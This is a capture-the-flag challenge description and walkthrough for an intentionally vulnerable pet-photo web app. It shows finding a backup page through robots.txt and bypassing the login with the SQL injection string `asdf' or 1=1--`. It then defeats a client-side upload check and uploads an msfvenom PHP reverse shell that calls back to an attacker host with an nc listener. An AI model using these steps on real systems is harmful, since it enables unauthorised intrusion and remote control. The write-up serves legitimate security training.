## kitty exchange

### Tags

Broken Access Control,  Injection, Security Misconfiguration

### Difficulty and Points

easy;

### Description

The cat lady in the neighborhood develops a website to exchange picz of her precious pets. She accidentally opend her test environment to the public. Garfilds portraits are secure though, she says.

### Hints (and price in percent of possible points)

1. What web pages can you access? (10 %)
2. Is the login securely implemented? (15 %)
3. You can only upload images! Do you? (25 %)

### Solution tl;dr

- Look which pages are accessible. Hint: robots.txt -> index.php.bak -> login.php
- User: `asdf' or 1=1--`
- Circumvent JavaScript mime type check
- Upload a .php file, like one created using:
  `msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw -o phpreverseshell.php`
  `msfvenom -p php/reverse_php LHOST=192.168.42.181 LPORT=4444 -f raw -o phpreverseshell.php`
- `nc -l -p 4444`
- `cat /DS-*`

### Writeup

- You are provided with an IP <IP> to the web app.
- At a first glace the web app isn't functional yet.
- Let's try to find some hidden pages the developer already uploaded, but didn't make public.
- We can automate the search using nikto or dirb, but lets poke around manually for now.
- A great way to get an overview of a website is to check <IP>/sitemap.xml or <IP>/robots.txt.
- No luck with the former, but we have a hit with the later.
- This gives us the hint that a crawler shouldn't cache *.bak files. Maybe the developer uses this extention for versioning?
- Let's try the most obvious <IP>/index.html.bak. No luck. Now, <IP>/index.php.bak. Jackpot!
- It wants us to redirect to login.php. Now we're talkin'!
- Let's check if the login is vulnerable to sql injections by typing in random shit as username and password each followed by a single quote char.
- Whoops. Something went wrong there.
- Either we get out the big guns now, i.e. sqlmap. Oooorrrr, we play a bit around.
- Let's try the oldest trick in the book: `asdf' or 1=1--` as user and random shit as password. And - BAAAMMm - we are in. Seems the cat lady wasn't the smartest in coding class.
- Finally, we can upload our favorite kitty pic. But wait... can't we upload some php as well?
- Nope. The upload button magically dissapears. Mhhh, was that a rechest to the server already??? I don't think so!
- Let's check the source for JavaScript.
- Using my favorite browser, Firefox - obviously! -, pressing strl+shift+i opens the developer tools.
- Searching for "IMAGE FILES ONLY" in the source reveals, the button.style.visibility is set to "hidden". But we don't want that. Let's change it to "visible". Et voilà! We can upload .php files now.
- I'm too lazy to write php myself... so I just generate my webshell using Metasploits msfvenom:
    - Syntax: `msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw -o phpreverseshell.php`
    - Note: I own the domain example.org and I have a port forwarding set up to my local machine on tcp 4444.
    - Which makes the cmd: `msfvenom -p php/reverse_php LHOST=example.org LPORT=4444 -f raw -o phpreverseshell.php`
- Opening a listener with netcat ... `nc -l -p 4444`
- ... uploading phpreverseshell.php ...
- ... I get my secure kitty link <IP>/upload/0ffc7b...c9b6d.php
- ... and opening it in the browser, gives me my hoped for shell.
- Note: Using a reverse shell circumvents server side firewalling. However, it seems there is none. So, the same shit flies using a bind shell.
- Let's look around a bit, shell we? (pun intended)
    - `whoami` ... so far so expected.
    - `ls -al /` ... wait... what??? What do we have here? Can we read the token already? Yes, we can!
    - `cat /DS-token`
